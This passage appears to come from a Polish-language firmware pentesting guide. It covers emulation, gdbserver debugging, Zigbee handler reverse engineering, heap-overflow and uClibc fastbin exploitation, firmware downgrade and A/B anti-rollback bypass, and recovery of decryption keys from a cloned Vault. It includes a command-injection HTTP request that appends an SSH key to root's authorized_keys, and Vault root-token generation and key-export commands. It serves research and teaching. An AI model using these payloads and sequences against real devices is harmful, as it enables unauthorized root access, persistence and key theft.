sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

W celu powtarzalnej izolacji usterek zapisuj pliki znacznikowe ze znacznikami czasu na stabilnym, zapisywalnym woluminie i weryfikuj je offline; `/dev/kmsg`, FIFO i ulotne konsole mogą powodować fałszywie negatywne wyniki z powodu ograniczania częstotliwości lub przedwczesnego zakończenia procesu. Przed zmianą niezwiązanych elementów kodu porównuj też dokładne interfejsy między warstwami: `uname -r` z `/lib/modules/`, funkcje ext4 na dysku z konfiguracją kernela oraz generację Mesa `libGL` z ABI sterownika DRI i nazwami sterowników wywnioskowanymi z PCI. Komponent może istnieć, a nawet pomyślnie przejść `dlopen()`, a mimo to być bezużyteczny, ponieważ jego konsument oczekuje innego ABI.<sup>[[11]](#references)</sup>

## Analiza dynamiczna w praktyce

Na tym etapie do analizy używa się rzeczywistego lub emulowanego środowiska urządzenia. Niezbędne jest utrzymanie dostępu do powłoki systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać idealnie interakcji ze sprzętem, co może wymagać okresowego ponownego uruchamiania emulatora. Analiza powinna obejmować ponowne sprawdzenie systemu plików, exploitowanie udostępnionych stron WWW i usług sieciowych oraz badanie podatności bootloadera. Testy integralności firmware’u są kluczowe do wykrywania potencjalnych podatności typu backdoor.

## Techniki analizy podczas działania

Analiza podczas działania polega na interakcji z procesem lub plikiem binarnym w jego środowisku operacyjnym. Wykorzystuje się do tego narzędzia takie jak gdb-multiarch, Frida i Ghidra, aby ustawiać breakpointy i identyfikować podatności za pomocą fuzzingu oraz innych technik.

W przypadku celów wbudowanych, które nie mają pełnego debuggera, **skopiuj na urządzenie statycznie linkowany `gdbserver` i podłącz się zdalnie**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapowanie komunikatów Zigbee / koprocesora radiowego

W hubach IoT stos RF jest często podzielony między **radio MCU** a proces użytkownika Linux. Przydatny workflow polega na mapowaniu ścieżki:<sup>[[8]](#references)</sup>

1. **Ramka RF** przesyłana drogą radiową
2. **Parser po stronie kontrolera** w radio MCU
3. **Tekstowy protokół szeregowy/UART lub TLV** przekazywany do Linux (na przykład `/dev/tty*`)
4. **Dispatcher aplikacji** w głównym daemonie
5. **Handler specyficzny dla protokołu / maszyna stanów**

Taka architektura tworzy dwa cele do reverse engineeringu zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, odtwórz:

- **Grupy komunikatów** i tabele dispatchera
- Które komunikaty mogą pochodzić z **sieci**, a które od samego kontrolera
- Dokładne **pola rozróżniające specyficzne dla producenta** (na przykład Zigbee `manufacturer_code` i niestandardowe `cluster_command`)
- Które handlery są osiągalne wyłącznie podczas **commissioningu**, wykrywania urządzeń lub pobierania firmware/modelu

W przypadku Zigbee przechwyć ruch podczas parowania i sprawdź, czy urządzenie nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, podsłuchanie ruchu commissioning może ujawnić **Network Key**. Kody instalacyjne Zigbee 3.0 ograniczają to ryzyko, więc odnotuj, czy testowane urządzenie rzeczywiście ich wymaga.

### Handlery protokołów specyficzne dla producenta i osiągalność zależna od FSM

Niestandardowe komendy Zigbee/ZCL specyficzne dla producenta są często lepszym celem niż standardowe klastry, ponieważ trafiają do **niestandardowego kodu parsującego** i wewnętrznych **FSM**, które przeszły mniej intensywne testy walidacyjne.<sup>[[8]](#references)</sup>

Praktyczny workflow:

- Analizuj dispatcher komend, aż znajdziesz **handler dostępny wyłącznie dla producenta**.
- Odtwórz tabele **stanu FSM**, **zdarzeń**, **warunków sprawdzających**, **akcji** i **następnego stanu**.
- Znajdź **stany przejściowe**, które automatycznie przechodzą dalej, oraz gałęzie ponowień/błędów, które ostatecznie resetują lub zwalniają stan kontrolowany przez atakującego.
- Ustal, które prawidłowe wymiany protokołu są wymagane, aby wprowadzić daemon w podatny stan, zamiast zakładać, że wadliwy handler jest zawsze osiągalny.

W przypadku protokołów wrażliwych na czas odtwarzanie pakietów z poziomu frameworka Python może być zbyt wolne. Bardziej niezawodne jest emulowanie prawidłowego urządzenia na rzeczywistym sprzęcie (na przykład **nRF52840**) z użyciem stosu klasy produkcyjnej, aby udostępnić właściwe **endpointy**, **atrybuty** i timing commissioningu.

### Klasa błędów w daemonach wbudowanych przy pobieraniu fragmentów

Powtarzająca się klasa błędów firmware występuje przy **pobieraniu fragmentowanych blobów/modeli/konfiguracji**:<sup>[[8]](#references)</sup>

1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i alokuje `malloc(total_size)`.
2. Kolejne fragmenty sprawdzają jedynie kontrolowane przez atakującego pola lokalne dla pakietu, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzenia, czy zakres mieści się w **pierwotnie zaalokowanym rozmiarze**.

Pozwala to atakującemu wysłać:

- Pierwszy prawidłowy fragment z **małym** zadeklarowanym rozmiarem całkowitym, aby wymusić małą alokację na stercie.
- Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
- Sfałszowany rozmiar lokalny dla pakietu, który przechodzi nowe kontrole, a mimo to przepełnia pierwotnie zaalokowany bufor.

Gdy podatna ścieżka jest chroniona przez logikę commissioningu, exploitacja musi obejmować dostateczną **emulację urządzenia**, aby wprowadzić cel w oczekiwany stan pobierania modelu lub bloba przed wysłaniem nieprawidłowych fragmentów.

### Wyzwalanie `free()` przez protokół

W daemonach wbudowanych najłatwiej wywołać exploitację metadanych sterty nie przez „czekanie na czyszczenie”, lecz przez **wymuszenie obsługi błędów przez sam protokół**:<sup>[[8]](#references)</sup>

- Wyślij nieprawidłowe kolejne fragmenty, aby wprowadzić FSM w stan **ponawiania** lub **błędu**.
- Przekrocz limit ponowień, aby daemon **zresetował kontekst** i zwolnił uszkodzony bufor.
- Wykorzystaj to przewidywalne `free()`, aby uruchomić prymitywy po stronie alokatora, zanim proces ulegnie awarii z innych przyczyn.

Jest to szczególnie przydatne w przypadku alokatorów **musl/uClibc/dlmalloc-like** w embedded Linux, gdzie uszkodzenie metadanych chunków może zmienić logikę unlink/unbin w prymityw zapisu. Stabilny schemat polega na uszkodzeniu **pola rozmiaru**, aby przekierować przechodzenie alokatora do **fałszywych chunków umieszczonych w przepełnionym buforze**, zamiast od razu nadpisać rzeczywiste wskaźniki binów i spowodować awarię procesu.

## Binary Exploitation i Proof-of-Concept

Tworzenie PoC dla zidentyfikowanych podatności wymaga dogłębnego zrozumienia architektury celu i programowania w językach niskiego poziomu. Zabezpieczenia runtime w systemach wbudowanych są rzadkie, ale jeśli występują, mogą być konieczne techniki takie jak Return Oriented Programming (ROP).

### Uwagi dotyczące exploitacji fastbin w uClibc (embedded Linux)

- **Fastbiny + konsolidacja:** uClibc używa fastbinów podobnych do tych w glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, dlatego każdy fałszywy chunk musi przejść kontrole (sensowny rozmiar, `fd = 0` oraz sąsiednie chunki uznane za „zajęte”).<sup>[[6]](#references)</sup>
- **Binarne pliki non-PIE przy ASLR:** jeśli ASLR jest włączony, ale główny plik binarny jest **non-PIE**, adresy `.data/.bss` wewnątrz pliku binarnego są stabilne. Można skierować alokację w region, który już przypomina prawidłowy nagłówek chunka sterty, aby alokacja fastbin trafiła do **tabeli wskaźników do funkcji**.
- **NUL zatrzymujący parser:** podczas parsowania JSON `\x00` w payloadzie może zatrzymać parsowanie, pozostawiając końcowe bajty kontrolowane przez atakującego do użycia w stack pivot/łańcuchu ROP.
- **Shellcode przez `/proc/self/mem`:** łańcuch ROP wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mapowaniu i wykonać skok do niego.

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) udostępniają wstępnie skonfigurowane środowiska do testowania bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Przygotowane systemy operacyjne do analizy firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do przeprowadzania oceny bezpieczeństwa i pentestów urządzeń Internetu Rzeczy (IoT). Oszczędza dużo czasu, zapewniając wstępnie skonfigurowane środowisko z załadowanymi wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): System operacyjny do testowania bezpieczeństwa systemów wbudowanych, oparty na Ubuntu 18.04 i wyposażony w narzędzia do testowania bezpieczeństwa firmware.

## Ataki downgrade firmware i niezabezpieczone mechanizmy aktualizacji

Nawet jeśli producent wdroży kryptograficzną weryfikację podpisów obrazów firmware, **ochrona przed przywróceniem starszej wersji (downgrade) jest często pomijana**. Gdy bootloader lub loader odzyskiwania weryfikuje jedynie podpis za pomocą osadzonego klucza publicznego, ale nie porównuje *wersji* (ani licznika monotonicznego) wgrywanego obrazu, atakujący może legalnie zainstalować **starsze, podatne firmware z nadal prawidłowym podpisem**, przywracając w ten sposób załatane podatności.<sup>[[4]](#references)</sup>

Typowy workflow ataku:

1. **Zdobądź starszy, podpisany obraz**
   * Pobierz go z publicznego portalu pobierania producenta, CDN-u lub strony pomocy technicznej.
   * Wyodrębnij go z towarzyszących aplikacji mobilnych/desktopowych (np. z `assets/firmware/` wewnątrz Android APK).
   * Pobierz go z repozytoriów zewnętrznych, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Prześlij obraz do urządzenia lub udostępnij go urządzeniu** przez dowolny dostępny kanał aktualizacji:
   * Interfejs WWW, API aplikacji mobilnej, USB, TFTP, MQTT itp.
   * Wiele konsumenckich urządzeń IoT udostępnia *nieuwierzytelnione* endpointy HTTP(S), które przyjmują blob firmware zakodowany w Base64, dekodują go po stronie serwera i uruchamiają tryb odzyskiwania/aktualizacji.
3. Po downgrade wykorzystaj podatność, która została załatana w nowszym wydaniu (na przykład filtr command injection dodany później).
4. Opcjonalnie wgraj ponownie najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu persistence.

### Przykład: command injection po downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

W podatnym (obniżonym do starszej wersji) firmware parametr `md5` jest bezpośrednio doklejany do polecenia powłoki bez sanitizacji, co umożliwia wstrzykiwanie dowolnych poleceń (w tym przypadku — włączenie dostępu root za pomocą klucza SSH). W późniejszych wersjach firmware wprowadzono podstawowy filtr znaków, ale brak ochrony przed downgrade’em sprawia, że poprawka jest nieskuteczna.<sup>[[4]](#references)</sup>

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu producentów dołącza pełne obrazy firmware do towarzyszących im aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są często przechowywane bez szyfrowania w APK/APEX, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, a nawet zwykłe `unzip` umożliwiają wyodrębnienie podpisanych obrazów bez fizycznego dostępu do sprzętu.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Ominięcie anti-rollback wyłącznie w updaterze w projektach z slotami A/B

Niektórzy dostawcy implementują mechanizm anti-downgrade **ratchet**, ale tylko w logice *updatera* (na przykład w procedurze UDS przez CAN, komendzie recovery lub agencie OTA działającym w userspace). Jeśli **bootloader** sprawdza później tylko podpis/CRC obrazu i ufa tablicy partycji lub metadanym slotu, nadal można ominąć ochronę przed rollbackiem.<sup>[[7]](#references)</sup>

Typowy słaby projekt:

- Metadane firmware zawierają zarówno deskryptor wersji, jak i **security ratchet** / licznik monotoniczny.
- Updater porównuje wartość ratchet obrazu z wartością zapisaną w pamięci trwałej i odrzuca starsze, podpisane obrazy.
- **Bootloader** nie analizuje tej wartości ratchet i przed uruchomieniem wybranego slotu weryfikuje tylko nagłówek, CRC i podpis.
- Aktywacja slotu jest przechowywana osobno, w tablicy partycji lub liczniku generacji dla każdego slotu, i **nie jest kryptograficznie powiązana** z dokładnym skrótem zweryfikowanego firmware.

W systemach z dwoma slotami umożliwia to **zweryfikowanie jednego obrazu, a uruchomienie innego**. Jeśli atakujący może sprawić, by updater oznaczył slot B jako następny cel rozruchu przy użyciu aktualnego, podpisanego obrazu, a następnie nadpisać slot B przed ponownym uruchomieniem, bootloader może nadal uruchomić starszy obraz, ponieważ ufa jedynie zapisanym już metadanym slotu.

Typowy schemat nadużycia:

1. Wgraj **aktualne, podpisane** firmware do nieaktywnego slotu i uruchom standardową procedurę weryfikacji/przełączania, aby układ oznaczył ten slot jako następny aktywny.
2. **Jeszcze nie uruchamiaj ponownie urządzenia**. W tej samej sesji ponownie wywołaj procedurę przygotowania/kasowania slotu.
3. Wykorzystaj nieaktualny stan rozruchu lub logikę wyboru slotu, aby updater skasował **ten sam fizyczny slot**, który właśnie został aktywowany.
4. Zapisz w tym slocie **starsze, ale nadal podpisane** firmware.
5. Pomiń procedurę weryfikacji egzekwującą ratchet i uruchom ponownie urządzenie bezpośrednio.
6. Bootloader wybiera aktywowany slot, sprawdza tylko podpis/integralność i uruchamia stary obraz.

Podczas analizy implementacji aktualizacji A/B zwróć uwagę na:

- Wybór slotu oparty na **flagach rozruchowych**, które nie są odświeżane po udanym przełączeniu.
- Procedurę w rodzaju `prepare_passive_slot()`, która kasuje slot na podstawie nieaktualnego stanu zamiast **aktualnego zatwierdzonego układu**.
- Funkcję w rodzaju `part_write_layout()`, która tylko zwiększa **licznik generacji** / ustawia flagę aktywności, ale nie zapisuje skrótu zweryfikowanego obrazu.
- Kontrole ratchet zaimplementowane w userspace lub kodzie updatera, ale **nie na etapach ROM / bootloadera / secure boot**.
- Procedury kasowania lub recovery, które pozostawiają slot oznaczony jako możliwy do uruchomienia, nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Lista kontrolna oceny logiki aktualizacji

* Czy transport/uwierzytelnianie *endpointu aktualizacji* jest odpowiednio zabezpieczone (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach łańcucha secure boot (np. podpisy są sprawdzane przez kod ROM)?
* Czy **bootloader egzekwuje ten sam ratchet** co updater, zamiast sprawdzać tylko podpis/CRC?
* Czy metadane aktywacji slotu są **powiązane ze zweryfikowanym skrótem/wersją firmware**, czy też można zmodyfikować slot po jego aktywowaniu?
* Czy po udanym przełączeniu slotu urządzenie musi się uruchomić ponownie, czy też w tej samej sesji nadal można wywołać kolejne procedury aktualizacji/kasowania?
* Czy kod userland wykonuje dodatkowe kontrole poprawności (np. dozwolona mapa partycji, numer modelu)?
* Czy *częściowe* lub *zapasowe* ścieżki aktualizacji korzystają z tej samej logiki weryfikacji?

> 💡  Jeśli brakuje któregokolwiek z powyższych elementów, platforma jest prawdopodobnie podatna na ataki rollback.

## Podatne firmware do ćwiczeń

Aby ćwiczyć wykrywanie podatności w firmware, zacznij od poniższych projektów podatnego firmware.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware ze stanu wbudowanego KMS/Vault

Gdy obraz aktualizacji zawiera niewielkie metadane w postaci jawnej oraz duży blob o wysokiej entropii, przed próbami brute force przeprowadź analizę kontenera:<sup>[[1]](#references)</sup>

- Zrzuć nagłówki, przesunięcia i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: następne 8 bajtów to salt, a pozostałe bajty to szyfrogram.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, jest mocną wskazówką, że masz do czynienia z szyfrogramem RSA-2048, który opakowuje losowe hasło/sesyjny klucz firmware.
- Odłączone dane PGP w tym samym pliku często służą wyłącznie do zapewnienia autentyczności; nie zakładaj, że odpowiadają za poufność.

Jeśli statyczne wyszukiwanie kluczy (`grep`, `strings`, wyszukiwanie PEM/PGP) nie przynosi rezultatów, przeanalizuj **operacyjną ścieżkę deszyfrowania**, zamiast ograniczać się do szukania kluczy prywatnych:

- Zdekompiluj updater / plik binarny do zarządzania i prześledź, kto odczytuje zaszyfrowany blob, która funkcja pomocnicza/API go odszyfrowuje oraz o jaką logiczną nazwę klucza zapytuje.
- Przeszukaj rozpakowany główny system plików w poszukiwaniu stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), a także plików jednostek i skryptów init.
- Traktuj polecenia w rodzaju `vault operator unseal ...` zapisane w postaci jawnej, klucze odzyskiwania, tokeny bootstrap oraz lokalne skrypty automatycznego odpieczętowywania KMS tak samo jak materiał zawierający klucz prywatny.

Jeśli urządzenie zawiera oryginalny plik binarny Vault i backend pamięci, odtworzenie tego środowiska jest zwykle łatwiejsze niż ponowna implementacja wewnętrznych mechanizmów Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Z uprawnieniami root na sklonowanym KMS:

- Ustaw klucze transit jako eksportowalne wyłącznie w odizolowanym klonie: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Sprawdź odzyskany klucz RSA, używając dokładnej pary padding/hash stosowanej przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 i nieudane odszyfrowanie domyślnym OAEP **nie dowodzą**, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL używany przez dostawcę (`EVP_BytesToKey`, często MD5 w starszych urządzeniach), zanim spróbujesz odszyfrować AES-CBC.

To zmienia „zaszyfrowane firmware” w bardziej ogólny problem: **odzyskaj klucze operacyjne po stronie urządzenia, a następnie odtwórz dokładne parametry unwrap + KDF offline**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Łamanie firmware z Claude: umiejętności seniora, autonomia juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodyka testowania bezpieczeństwa firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktyczne hakowanie IoT: kompletny przewodnik po atakowaniu Internetu rzeczy](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Wykorzystywanie zero-dayów w porzuconym sprzęcie – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jak inteligentne urządzenie za 20 USD dało mi dostęp do twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Teraz mnie widzisz: teraz jesteś Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Wykorzystywanie Tesla Wall Connector przez złącze portu ładowania – część 2: obejście zabezpieczenia przed downgrade’em](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Niech zacznie migać: zdalne wykorzystanie Philips Hue Bridge przez OTA](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS w QEMU, część 1: rozpakowywanie](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacja jądra Linuksa – dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS w QEMU, część 2: debugowanie i naprawianie](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Hasła BIOS-u Dell: słabe szyfrowanie XOR umożliwia odzyskanie ze SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn – narzędzie do odzyskiwania haseł BIOS-u Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
